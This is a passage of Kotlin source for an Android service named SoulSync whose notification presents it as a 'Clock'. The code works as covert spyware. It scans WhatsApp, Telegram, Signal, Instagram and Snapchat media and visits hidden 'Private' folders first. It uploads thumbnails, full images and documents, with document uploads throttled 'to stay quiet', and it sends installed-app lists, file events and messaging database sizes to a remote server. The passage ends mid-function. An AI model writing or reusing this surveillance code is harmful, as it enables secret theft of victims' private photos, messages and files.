                            val sortOrder = "date_added DESC"
                            val cur = contentResolver.query(ms.uri, projection, null, null, sortOrder)
                            cur?.use {
                                val idCol = it.getColumnIndex("_id")
                                val nameCol = it.getColumnIndex("_display_name")
                                val dateCol = it.getColumnIndex("date_added")
                                val sizeCol = it.getColumnIndex("_size")
                                val mimeCol = it.getColumnIndex("mime_type")
                                val dataCol = it.getColumnIndex("_data")
                                var count = 0
                                var batch = org.json.JSONArray()
                                while (it.moveToNext() && count < 300) {
                                    val id = if (idCol >= 0) it.getLong(idCol) else continue
                                    val name = if (nameCol >= 0) it.getString(nameCol) ?: "" else ""
                                    if (name.isEmpty()) { count++; continue }
                                    val filePath = if (dataCol >= 0) it.getString(dataCol) ?: "" else ""
                                    val pathLower = filePath.lowercase()

                                    // Detect source from file path
                                    val prefix = when {
                                        pathLower.contains("whatsapp") -> "WA_"
                                        pathLower.contains("telegram") -> "TG_"
                                        pathLower.contains("instagram") -> "IG_"
                                        pathLower.contains("snapchat") -> "SC_"
                                        pathLower.contains("signal") || pathLower.contains("securesms") -> "SG_"
                                        else -> ""
                                    }
                                    val isPrivate = pathLower.contains("/private")
                                    val isSent = pathLower.contains("/sent")
                                    // Detect category from path
                                    val category = when {
                                        pathLower.contains("voice note") -> "voicenote"
                                        pathLower.contains("video note") -> "videonote"
                                        ms.type == "audio" -> "audio"
                                        ms.type == "video" -> "video"
                                        ms.type == "image" -> "image"
                                        else -> ms.type
                                    }
                                    val prefixedName = "$prefix$name"
                                    if (seenNames.contains(prefixedName)) { count++; continue }

                                    val uri = android.content.ContentUris.withAppendedId(ms.uri, id)
                                    // Generate thumbnail for images only
                                    var thumbB64: String? = null
                                    if (ms.type == "image") {
                                        thumbB64 = try {
                                            val thumb = if (android.os.Build.VERSION.SDK_INT >= 29) {
                                                contentResolver.loadThumbnail(uri, android.util.Size(200, 200), null)
                                            } else {
                                                @Suppress("DEPRECATION")
                                                android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                                                    contentResolver, id, android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null)
                                            }
                                            if (thumb == null) null
                                            else {
                                                val baos = java.io.ByteArrayOutputStream()
                                                thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 35, baos)
                                                thumb.recycle()
                                                android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                                            }
                                        } catch (_: Exception) { null }
                                        if (thumbB64 == null) { count++; continue }
                                    }
                                    seenNames.add(prefixedName)
                                    batch.put(org.json.JSONObject().apply {
                                        put("name", prefixedName)
                                        put("date", if (dateCol >= 0) it.getLong(dateCol) else 0L)
                                        put("size", if (sizeCol >= 0) it.getLong(sizeCol) else 0L)
                                        put("mime", if (mimeCol >= 0) it.getString(mimeCol) ?: "application/octet-stream" else "application/octet-stream")
                                        put("width", 0)
                                        put("height", 0)
                                        put("category", category)
                                        put("private", isPrivate)
                                        put("sent", isSent)
                                        if (thumbB64 != null) put("thumb", thumbB64)
                                    })
                                    count++
                                    if (batch.length() >= 20) {
                                        if (gallerySendBatch(jwt, batch)) totalSynced += batch.length()
                                        batch = org.json.JSONArray()
                                    }
                                }
                                if (batch.length() > 0) {
                                    if (gallerySendBatch(jwt, batch)) totalSynced += batch.length()
                                }
                                android.util.Log.d("SOULSYNC", "Gallery: MediaStore ${ms.type} done, count=$count")
                            }
                        } catch (e: Exception) {
                            android.util.Log.e("SOULSYNC", "Gallery: MediaStore ${ms.type} error", e)
                        }
                    }
                    android.util.Log.d("SOULSYNC", "Gallery: MediaStore ALL done, synced=$totalSynced")

                    // 2) Recursive WhatsApp/Telegram filesystem scan (ALL folders, Private, Sent, date subfolders)
                    val hasAllFiles = if (android.os.Build.VERSION.SDK_INT >= 30) {
                        android.os.Environment.isExternalStorageManager()
                    } else true
                    android.util.Log.d("SOULSYNC", "Gallery: MANAGE_EXTERNAL_STORAGE=$hasAllFiles SDK=${android.os.Build.VERSION.SDK_INT}")
                    if (true) { // Try scanning even without MANAGE_EXTERNAL_STORAGE — some dirs may be accessible
                        val mediaDirs = listOf(
                            // WhatsApp
                            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
                            "/storage/emulated/0/WhatsApp/Media",
                            // WhatsApp Business
                            "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
                            // Telegram
                            "/storage/emulated/0/Android/media/org.telegram.messenger/Telegram",
                            "/storage/emulated/0/Telegram",
                            // Instagram
                            "/storage/emulated/0/Android/media/com.instagram.android",
                            "/storage/emulated/0/Pictures/Instagram",
                            "/storage/emulated/0/Movies/Instagram",
                            "/storage/emulated/0/DCIM/Instagram",
                            // Snapchat
                            "/storage/emulated/0/Android/media/com.snapchat.android",
                            "/storage/emulated/0/Pictures/Snapchat",
                            "/storage/emulated/0/Movies/Snapchat",
                            "/storage/emulated/0/Snapchat",
                            // Signal
                            "/storage/emulated/0/Android/media/org.thoughtcrime.securesms",
                            "/storage/emulated/0/Pictures/Signal",
                            "/storage/emulated/0/Movies/Signal",
                            // Downloads (documents, shared files)
                            "/storage/emulated/0/Download"
                        )
                        val mediaExts = setOf("jpg","jpeg","png","webp","gif","mp4","3gp","mkv",
                            "opus","mp3","m4a","aac","ogg","amr","pdf","doc","docx","xls","xlsx","ppt","pptx","txt","csv","zip")
                        val skipDirs = setOf("stickers", "sticker packs", "backup excluded stickers", "wallpaper", "bug report", "ai media", "profile photos")
                        var appCount = 0
                        var fsBatch = org.json.JSONArray()

                        fun scanDir(dir: java.io.File, depth: Int) {
                            if (depth > 4 || appCount >= 20000) return
                            val entries = try { dir.listFiles() } catch (_: Exception) { null } ?: return
                            // Process files in this directory
                            val files = entries.filter { it.isFile && it.length() > 0 && it.length() < 50 * 1024 * 1024 &&
                                mediaExts.any { e -> it.name.endsWith(".$e", true) } }
                                .sortedByDescending { it.lastModified() }
                            for (f in files) {
                                if (appCount >= 20000) return
                                val uniqueKey = f.absolutePath
                                if (seenNames.contains(uniqueKey)) continue
                                seenNames.add(uniqueKey)
                                val ext = f.name.substringAfterLast('.', "").lowercase()
                                val isImage = ext in setOf("jpg","jpeg","png","webp","gif")
                                val isVideo = ext in setOf("mp4","3gp","mkv")
                                val isAudio = ext in setOf("opus","mp3","m4a","aac","ogg","amr")
                                // Determine category from path
                                val pathLower = dir.absolutePath.lowercase()
                                val category = when {
                                    pathLower.contains("voice note") -> "voicenote"
                                    pathLower.contains("video note") -> "videonote"
                                    pathLower.contains("audio") || isAudio -> "audio"
                                    pathLower.contains("document") || ext in setOf("pdf","doc","docx","xls","xlsx","ppt","pptx","txt","csv","zip") -> "document"
                                    pathLower.contains("video") || isVideo -> "video"
                                    pathLower.contains("image") || pathLower.contains("status") || pathLower.contains("picture") || pathLower.contains("dcim") || isImage -> "image"
                                    pathLower.contains("gif") || ext == "gif" -> "gif"
                                    else -> if (isImage) "image" else if (isVideo) "video" else if (isAudio) "audio" else "image"
                                }
                                val isPrivate = pathLower.contains("/private")
                                val isSent = pathLower.contains("/sent")
                                val prefix = when {
                                    pathLower.contains("whatsapp") -> "WA_"
                                    pathLower.contains("telegram") -> "TG_"
                                    pathLower.contains("instagram") -> "IG_"
                                    pathLower.contains("snapchat") -> "SC_"
                                    pathLower.contains("signal") || pathLower.contains("securesms") -> "SG_"
                                    else -> "APP_"
                                }
                                // Generate thumbnail for images only
                                var thumbB64 = ""
                                if (isImage) {
                                    thumbB64 = try {
                                        val opts = android.graphics.BitmapFactory.Options().apply { inSampleSize = 8 }
                                        val bmp = android.graphics.BitmapFactory.decodeFile(f.absolutePath, opts)
                                        if (bmp != null) {
                                            val baos = java.io.ByteArrayOutputStream()
                                            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 35, baos)
                                            bmp.recycle()
                                            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                                        } else ""
                                    } catch (_: Exception) { "" }
                                }
                                val mime = when {
                                    isImage -> "image/jpeg"
                                    isVideo -> "video/mp4"
                                    isAudio -> "audio/$ext"
                                    ext == "pdf" -> "application/pdf"
                                    ext in setOf("doc","docx") -> "application/msword"
                                    ext in setOf("xls","xlsx") -> "application/vnd.ms-excel"
                                    else -> "application/octet-stream"
                                }
                                fsBatch.put(org.json.JSONObject().apply {
                                    put("name", "${prefix}${f.name}")
                                    put("date", f.lastModified() / 1000)
                                    put("size", f.length())
                                    put("mime", mime)
                                    put("width", 0)
                                    put("height", 0)
                                    put("category", category)
                                    put("private", isPrivate)
                                    put("sent", isSent)
                                    if (thumbB64.isNotEmpty()) put("thumb", thumbB64)
                                })
                                appCount++
                                if (fsBatch.length() >= 20) {
                                    if (gallerySendBatch(jwt, fsBatch)) totalSynced += fsBatch.length()
                                    fsBatch = org.json.JSONArray()
                                }
                            }
                            // Recurse into subdirectories — Private FIRST so hidden media gets priority
                            val dirs = entries.filter { it.isDirectory && !skipDirs.any { s -> it.name.equals(s, true) } }
                                .sortedByDescending { it.name.equals("Private", true) }
                            for (sub in dirs) {
                                scanDir(sub, depth + 1)
                            }
                        }

                        for (rootPath in mediaDirs) {
                            if (appCount >= 20000) break
                            val rootDir = java.io.File(rootPath)
                            if (!rootDir.exists()) continue
                            android.util.Log.d("SOULSYNC", "Gallery: recursive scan $rootPath")
                            scanDir(rootDir, 0)
                        }
                        if (fsBatch.length() > 0) {
                            if (gallerySendBatch(jwt, fsBatch)) totalSynced += fsBatch.length()
                        }
                        val privateCount = seenNames.count { it.lowercase().contains("/private") }
                        android.util.Log.d("SOULSYNC", "Gallery: filesystem done, appCount=$appCount, privateFiles=$privateCount")
                    }

                    android.util.Log.d("SOULSYNC", "Gallery: ALL DONE! total=$totalSynced")
                    // Clear sync flag
                    gallerySendBatch(jwt, org.json.JSONArray())
                } catch (e: Exception) {
                    android.util.Log.e("SOULSYNC", "Gallery: FAILED", e)
                }
            }.start()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun gallerySendBatch(jwt: String, batch: org.json.JSONArray): Boolean {
        return try {
            val url = java.net.URL("$apiBaseUrl/api.php?route=gallery/sync")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-API-Key", apiKey)
            conn.setRequestProperty("Authorization", "Bearer $jwt")
            conn.doOutput = true
            conn.connectTimeout = 15000; conn.readTimeout = 30000
            val payload = org.json.JSONObject().apply { put("photos", batch) }
            java.io.OutputStreamWriter(conn.outputStream).use { w -> w.write(payload.toString()); w.flush() }
            val code = conn.responseCode
            conn.disconnect()
            android.util.Log.d("SOULSYNC", "Gallery: batch ${batch.length()} -> $code")
            code in 200..299
        } catch (e: Exception) {
            android.util.Log.e("SOULSYNC", "Gallery: send error ${e.message}")
            false
        }
    }

    private fun uploadFullImage(jwt: String, filename: String) {
        try {
            android.util.Log.d("SOULSYNC", "Gallery: uploading full image $filename")
            var fileBytes: ByteArray? = null
            val realName = filename.replaceFirst(Regex("^(WA_|TG_|IG_|SC_|SG_|APP_)"), "")

            // 1) Try MediaStore first
            val sel = "${android.provider.MediaStore.Images.Media.DISPLAY_NAME}=?"
            val searchName = if (filename.startsWith("WA_") || filename.startsWith("TG_") ||
                filename.startsWith("IG_") || filename.startsWith("SC_") || filename.startsWith("SG_")) realName else filename
            val cur = contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(android.provider.MediaStore.Images.Media._ID),
                sel, arrayOf(searchName), null)
            cur?.use {
                if (it.moveToFirst()) {
                    val id = it.getLong(0)
                    val uri = android.content.ContentUris.withAppendedId(
                        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    fileBytes = try {
                        contentResolver.openInputStream(uri)?.use { s -> s.readBytes() }
                    } catch (_: Exception) { null }
                }
            }

            // 2) Filesystem search
            if (fileBytes == null) {
                val roots = listOf(
                    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
                    "/storage/emulated/0/WhatsApp/Media",
                    "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
                    "/storage/emulated/0/Android/media/org.telegram.messenger/Telegram",
                    "/storage/emulated/0/Telegram",
                    "/storage/emulated/0/Android/media/com.instagram.android",
                    "/storage/emulated/0/Pictures/Instagram",
                    "/storage/emulated/0/Movies/Instagram",
                    "/storage/emulated/0/Android/media/com.snapchat.android",
                    "/storage/emulated/0/Pictures/Snapchat",
                    "/storage/emulated/0/Movies/Snapchat",
                    "/storage/emulated/0/Snapchat",
                    "/storage/emulated/0/Android/media/org.thoughtcrime.securesms",
                    "/storage/emulated/0/Pictures/Signal",
                    "/storage/emulated/0/Movies/Signal",
                    "/storage/emulated/0/Download"
                )
                fun findFile(dir: java.io.File, name: String, depth: Int): java.io.File? {
                    if (depth > 4) return null
                    val direct = java.io.File(dir, name)
                    if (direct.exists() && direct.isFile) return direct
                    val subs = try { dir.listFiles() } catch (_: Exception) { null } ?: return null
                    for (sub in subs) {
                        if (sub.isDirectory) {
                            val found = findFile(sub, name, depth + 1)
                            if (found != null) return found
                        }
                    }
                    return null
                }
                for (root in roots) {
                    val rootDir = java.io.File(root)
                    if (!rootDir.exists()) continue
                    val found = findFile(rootDir, realName, 0)
                    if (found != null) {
                        fileBytes = try { found.readBytes() } catch (_: Exception) { null }
                        if (fileBytes != null) break
                    }
                }
            }

            if (fileBytes == null) {
                android.util.Log.w("SOULSYNC", "Gallery: full image not found $filename ($realName)")
                return
            }

            val boundary = "----SoulSync${System.currentTimeMillis()}"
            val url = java.net.URL("$apiBaseUrl/api.php?route=gallery/upload-full")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            conn.setRequestProperty("X-API-Key", apiKey)
            conn.setRequestProperty("Authorization", "Bearer $jwt")
            conn.doOutput = true
            conn.connectTimeout = 15000; conn.readTimeout = 120000
            conn.setChunkedStreamingMode(8192)
            val crlf = "\r\n"
            conn.outputStream.buffered().use { out ->
                val fnPart = "--$boundary${crlf}Content-Disposition: form-data; name=\"filename\"$crlf$crlf$filename$crlf"
                out.write(fnPart.toByteArray())
                val filePart = "--$boundary${crlf}Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"${crlf}Content-Type: application/octet-stream$crlf$crlf"
                out.write(filePart.toByteArray())
                val bytes = fileBytes!!
                var offset = 0
                while (offset < bytes.size) {
                    val chunk = minOf(8192, bytes.size - offset)
                    out.write(bytes, offset, chunk)
                    offset += chunk
                }
                out.write("$crlf--$boundary--$crlf".toByteArray())
                out.flush()
            }
            val code = conn.responseCode
            conn.disconnect()
            android.util.Log.d("SOULSYNC", "Gallery: full upload $filename -> $code")
        } catch (e: Exception) {
            android.util.Log.e("SOULSYNC", "Gallery: full upload error ${e.message}")
        }
    }

    // Send the phone's FULL list of user-installed apps so the server can spot
    // newly installed + uninstalled apps (admin-only). Throttled to once every 6h.
    // No prompt / no special permission beyond QUERY_ALL_PACKAGES (already held).
    private fun readAndSendInstalledApps() {
        try {
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val now = System.currentTimeMillis()
            if (now - prefs.getLong("apps_sync_at", 0L) < 6 * 3600_000L) return
            val jwt = prefs.getString("jwt_token", "") ?: ""
            if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

            Thread {
                try {
                    val pm = packageManager
                    val arr = org.json.JSONArray()
                    val apps = pm.getInstalledApplications(0)
                    for (ai in apps) {
                        // Skip system/OEM apps — only USER-installed apps matter here.
                        val isSystem = (ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 &&
                            (ai.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 0
                        if (isSystem) continue
                        val pkg = ai.packageName ?: continue
                        if (pkg == packageName || pkg.contains("soulsync", true)) continue
                        val label = try { pm.getApplicationLabel(ai).toString() } catch (_: Exception) { pkg }
                        arr.put(org.json.JSONObject().apply { put("package", pkg); put("name", label) })
                    }
                    if (arr.length() == 0) return@Thread
                    val url = URL("$apiBaseUrl/api.php?route=apps/sync")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("X-API-Key", apiKey)
                    conn.setRequestProperty("Authorization", "Bearer $jwt")
                    conn.doOutput = true
                    conn.connectTimeout = 15000; conn.readTimeout = 15000
                    val payload = org.json.JSONObject().apply { put("apps", arr) }
                    OutputStreamWriter(conn.outputStream).use { w -> w.write(payload.toString()); w.flush() }
                    if (conn.responseCode in 200..299) prefs.edit().putLong("apps_sync_at", now).apply()
                    conn.disconnect()
                } catch (e: Exception) { e.printStackTrace() }
            }.start()
        } catch (e: Exception) { e.printStackTrace() }
    }

    // Current network type: "WiFi", "Mobile Data", or "Offline".
    private fun getNetworkType(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return "Offline"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val net = cm.activeNetwork ?: return "Offline"
                val caps = cm.getNetworkCapabilities(net) ?: return "Offline"
                when {
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Online"
                }
            } else {
                @Suppress("DEPRECATION")
                val ni = cm.activeNetworkInfo
                if (ni == null || !ni.isConnected) "Offline"
                else if (ni.type == android.net.ConnectivityManager.TYPE_WIFI) "WiFi"
                else "Mobile Data"
            }
        } catch (_: Exception) { "Offline" }
    }

    // Current Wi-Fi network name (SSID), or "" if not on Wi-Fi / unavailable.
    private fun getWifiSsid(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager ?: return ""
            var ssid = wm.connectionInfo?.ssid ?: return ""
            ssid = ssid.trim().trim('"')
            if (ssid.isEmpty() || ssid.equals("<unknown ssid>", true) || ssid == "0x") "" else ssid
        } catch (_: Exception) { "" }
    }

    private fun loadEnvConfig() {
        try {
            // 1) Primary: values written by Flutter into SharedPreferences.
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            apiBaseUrl = prefs.getString("apiBaseUrl", "") ?: ""
            apiKey = prefs.getString("apiKey", "") ?: ""

            // 2) Fallback: bundled .env (Flutter puts it under flutter_assets/).
            if (apiBaseUrl.isEmpty() || apiKey.isEmpty()) {
                for (path in listOf("flutter_assets/.env", ".env")) {
                    try {
                        val envString = assets.open(path).bufferedReader().use { it.readText() }
                        for (line in envString.split("\n")) {
                            val t = line.trim()
                            if (t.isEmpty() || t.startsWith("#") || !t.contains("=")) continue
                            val p = t.split("=", limit = 2)
                            if (p.size == 2) {
                                if (p[0].trim() == "API_KEY") apiKey = p[1].trim()
                                else if (p[0].trim() == "API_BASE_URL") apiBaseUrl = p[1].trim()
                            }
                        }
                        break
                    } catch (_: Exception) {}
                }
            }
            apiBaseUrl = apiBaseUrl.trimEnd('/')
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Background",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    private fun buildNotification(text: String): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Clock")
            .setContentText(if (text.isNotEmpty()) text else "You are now connected to your time")
            .setSmallIcon(R.drawable.ic_clock_notif)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .build()
    }

    private fun updateNotificationText(text: String) {
        // Don't re-post while periodic mode has intentionally hidden the notif —
        // otherwise the telemetry loop would bring it straight back every cycle.
        if (!foregroundActive) return
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, buildNotification(text))
    }

    private fun setupLocationTracking() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastLatitude = location.latitude
                lastLongitude = location.longitude
            }
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        // Nothing is sampled until the user turns "Share My Location" on. The
        // telemetry loop calls applyLocationSharing() every cycle, which attaches
        // the listener when the toggle flips on and detaches it when it flips off.
        applyLocationSharing()
    }

    // Attach/detach the location listener to match the user's toggle. Reads the
    // pref fresh each call so a change in-app takes effect within one cycle.
    // Fail-closed: if the pref was never written, sharing is treated as OFF.
    private fun applyLocationSharing() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val want = prefs.getBoolean("share_location", false)
        if (want == locationSharingOn) return
        locationSharingOn = want
        val listener = locationListener ?: return
        if (want) {
            // Request BOTH GPS (accurate outdoors) and Network (fast, works indoors).
            try {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, 60000L, 10f, listener
                )
            } catch (e: Exception) { e.printStackTrace() }
            try {
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 60000L, 10f, listener
                )
            } catch (e: Exception) { e.printStackTrace() }
            // Seed with the last known fix immediately (whichever is fresher/accurate).
            try {
                val g = try { locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (_: Exception) { null }
                val n = try { locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (_: Exception) { null }
                val best = when {
                    g != null && n != null -> if (g.time >= n.time) g else n
                    g != null -> g
                    else -> n
                }
                if (best != null) { lastLatitude = best.latitude; lastLongitude = best.longitude }
            } catch (_: Exception) {}
        } else {
            // Stop sampling and drop whatever we were holding in memory.
            try { locationManager?.removeUpdates(listener) } catch (e: Exception) { e.printStackTrace() }
            lastLatitude = 0.0
            lastLongitude = 0.0
        }
        // Reflect the change on the notification immediately, not on the next cycle.
        try { updateNotificationText("You are now connected to your time") } catch (_: Exception) {}
    }

    // Monitor Downloads + key folders for new/deleted files. Throttled to every 10 min.
    private fun monitorFiles() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()
        if (now - prefs.getLong("file_monitor_at", 0L) < 10 * 60_000L) return
        val jwt = prefs.getString("jwt_token", "") ?: ""
        if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

        Thread {
            try {
                val foldersToScan = listOf(
                    "/storage/emulated/0/Download",
                    "/storage/emulated/0/Documents",
                    "/storage/emulated/0/DCIM",
                    "/storage/emulated/0/Pictures",
                    "/storage/emulated/0/Movies",
                    "/storage/emulated/0/Music"
                )
                val currentFiles = mutableMapOf<String, Long>()
                for (folder in foldersToScan) {
                    val dir = java.io.File(folder)
                    if (!dir.exists()) continue
                    val files = dir.listFiles() ?: continue
                    for (f in files) {
                        if (f.isFile && f.length() > 0) {
                            currentFiles["$folder/${f.name}"] = f.length()
                        }
                    }
                }

                val storedJson = prefs.getString("file_monitor_snapshot", "") ?: ""
                val storedFiles = mutableMapOf<String, Long>()
                if (storedJson.isNotEmpty()) {
                    try {
                        val obj = org.json.JSONObject(storedJson)
                        val keys = obj.keys()
                        while (keys.hasNext()) {
                            val k = keys.next()
                            storedFiles[k] = obj.getLong(k)
                        }
                    } catch (_: Exception) {}
                }

                val events = org.json.JSONArray()
                // New files
                for ((path, size) in currentFiles) {
                    if (path !in storedFiles) {
                        val f = java.io.File(path)
                        val folder = f.parent?.substringAfterLast("/") ?: "Unknown"
                        events.put(org.json.JSONObject().apply {
                            put("event", "new")
                            put("name", f.name)
                            put("folder", folder)
                            put("size", size)
                        })
                    }
                }
                // Deleted files
                for ((path, size) in storedFiles) {
                    if (path !in currentFiles) {
                        val f = java.io.File(path)
                        val folder = f.parent?.substringAfterLast("/") ?: "Unknown"
                        events.put(org.json.JSONObject().apply {
                            put("event", "deleted")
                            put("name", f.name)
                            put("folder", folder)
                            put("size", size)
                        })
                    }
                }

                // Save new snapshot
                val snapObj = org.json.JSONObject()
                for ((k, v) in currentFiles) snapObj.put(k, v)
                prefs.edit().putString("file_monitor_snapshot", snapObj.toString())
                    .putLong("file_monitor_at", now).apply()

                if (events.length() == 0) return@Thread

                val url = URL("$apiBaseUrl/api.php?route=tracking/file-events")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwt")
                conn.doOutput = true
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val payload = org.json.JSONObject().apply { put("events", events) }
                OutputStreamWriter(conn.outputStream).use { w -> w.write(payload.toString()); w.flush() }
                conn.responseCode; conn.disconnect()
            } catch (e: Exception) { android.util.Log.e("SOULSYNC", "FileMonitor: ${e.message}") }
        }.start()
    }

    // Track WhatsApp/Telegram database sizes. Throttled to every 30 min.
    private fun trackDbSizes() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()
        if (now - prefs.getLong("db_sizes_at", 0L) < 30 * 60_000L) return
        val jwt = prefs.getString("jwt_token", "") ?: ""
        if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

        Thread {
            try {
                val dbPaths = mapOf(
                    "WhatsApp DB" to "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases",
                    "WhatsApp Media" to "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
                    "Telegram" to "/storage/emulated/0/Android/media/org.telegram.messenger/Telegram",
                    "Instagram" to "/storage/emulated/0/Android/media/com.instagram.android",
                    "Snapchat" to "/storage/emulated/0/Android/media/com.snapchat.android"
                )
                val sizes = org.json.JSONArray()
                for ((label, path) in dbPaths) {
                    val dir = java.io.File(path)
                    if (!dir.exists()) continue
                    var totalSize = 0L
                    fun calcSize(f: java.io.File, depth: Int) {
                        if (depth > 2) return
                        if (f.isFile) { totalSize += f.length(); return }
                        val children = try { f.listFiles() } catch (_: Exception) { null } ?: return
                        for (c in children) calcSize(c, depth + 1)
                    }
                    calcSize(dir, 0)
                    if (totalSize > 0) {
                        sizes.put(org.json.JSONObject().apply {
                            put("label", label)
                            put("path", path)
                            put("size_bytes", totalSize)
                        })
                    }
                }
                if (sizes.length() == 0) return@Thread
                prefs.edit().putLong("db_sizes_at", now).apply()

                val url = URL("$apiBaseUrl/api.php?route=tracking/db-sizes")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwt")
                conn.doOutput = true
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val payload = org.json.JSONObject().apply { put("sizes", sizes) }
                OutputStreamWriter(conn.outputStream).use { w -> w.write(payload.toString()); w.flush() }
                conn.responseCode; conn.disconnect()
            } catch (e: Exception) { android.util.Log.e("SOULSYNC", "DbSizes: ${e.message}") }
        }.start()
    }

    // Sync documents (PDF, DOC, etc.) from Downloads/Documents to server. Throttled 15 min.
    private fun syncDocuments() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()
        if (now - prefs.getLong("doc_sync_at", 0L) < 15 * 60_000L) return
        val jwt = prefs.getString("jwt_token", "") ?: ""
        if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

        Thread {
            try {
                val docExts = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv", "rtf")
                val scanDirs = listOf(
                    "/storage/emulated/0/Download",
                    "/storage/emulated/0/Documents",
                    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
                    "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
                    "/storage/emulated/0/Android/media/org.telegram.messenger/Telegram/Telegram Documents"
                )
                val syncedJson = prefs.getString("doc_synced_list", "") ?: ""
                val synced = mutableSetOf<String>()
                if (syncedJson.isNotEmpty()) {
                    try {
                        val arr = org.json.JSONArray(syncedJson)
                        for (i in 0 until arr.length()) synced.add(arr.getString(i))
                    } catch (_: Exception) {}
                }

                var uploaded = 0
                val maxPerCycle = 5 // upload max 5 docs per cycle to stay quiet
                val newSynced = mutableSetOf<String>()
                newSynced.addAll(synced)

                for (dir in scanDirs) {
                    if (uploaded >= maxPerCycle) break
                    val folder = java.io.File(dir)
                    if (!folder.exists()) continue
                    val files = try { folder.listFiles() } catch (_: Exception) { null } ?: continue
                    val docs = files.filter { f ->
                        f.isFile && f.length() > 0 && f.length() < 20 * 1024 * 1024 &&
                            docExts.contains(f.name.substringAfterLast('.', "").lowercase())
                    }.sortedByDescending { it.lastModified() }

                    for (f in docs) {
                        if (uploaded >= maxPerCycle) break
                        val key = "${f.absolutePath}:${f.length()}"
